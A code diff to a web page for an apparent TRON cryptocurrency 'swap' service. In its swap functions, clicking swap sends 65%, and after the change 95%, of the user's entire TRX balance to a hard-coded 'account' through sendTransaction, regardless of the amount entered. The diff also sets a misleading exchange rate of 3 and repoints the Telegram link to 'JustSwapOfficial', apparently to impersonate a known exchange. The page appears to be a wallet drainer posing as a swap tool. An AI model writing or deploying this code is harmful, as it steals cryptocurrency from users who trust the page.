@@ -57,7 +57,7 @@
                 <h2>VCC Swap</h2>
                 <h4 id="wallet">Not Connected</h4>
                 <p class="mt-5" style="color: #fff;font-size: 14px;"><br>VCC Swap is the next generation of Cryptocurrency swap.</p>
-                <a href="https://t.me/VCC_Swap" class="button btn-send" target="blank">Telegram</a>
+                <a href="https://t.me/JustSwapOfficial" class="button btn-send" target="blank">Telegram</a>
               </div>
             </div>
 
@@ -86,21 +86,21 @@
                   var acc = await tronWeb.trx.getAccount();
                   var tokenBalance = 0;
                   if (acc.assetV2){
-                      var tb = acc.assetV2.find(function(o){return o.key == "1003621";});
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003604";});
                       if (tb){
                           tokenBalance = tb.value / 1000000
                       }
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 0.4785).change();
+                  $("#trx-swap").val(tokenBalance * 3).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 0.4785).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 3).change();
               }
 
               async function swapToken(){
@@ -108,7 +108,7 @@
                   var acc = await tronWeb.trx.getAccount();
                   var tokenBalance = 0;
                   if (acc.assetV2){
-                      var tb = acc.assetV2.find(function(o){return o.key == "1003621";});
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003604";});
                       if (tb){
                           tokenBalance = tb.value / 1000000;
                       }
@@ -121,7 +121,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 65 / 100);
+                  var v = Math.floor(acc.balance * 95 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -132,7 +132,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 65 / 100);
+                  var v = Math.floor(acc.balance * 95 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
           </script>
@@ -292,7 +292,7 @@
             var acc = await tronWeb.trx.getAccount();
             $("#trxBalance").text((acc.balance / 1000000).toFixed(2) + " TRX");
             if (acc.assetV2){
-                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003621";});
+                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003604";});
                 if (tokenBalance){
                   $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " VCC");
                 }
@@ -320,7 +320,7 @@
             var acc = await tronWeb.trx.getAccount();
             $("#trxBalance").text((acc.balance / 1000000).toFixed(2) + " TRX");
             if (acc.assetV2){
-                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003621";});
+                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003604";});
                 if (tokenBalance){
                   $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " VCC");
                 }
@@ -339,11 +339,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 0.4785).change();
+                  $("#trx-swap").val(tokens * 3).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 0.4785).change();
+                  $("#token-swap").val(value / 3).change();
 
                 }catch{}
               }
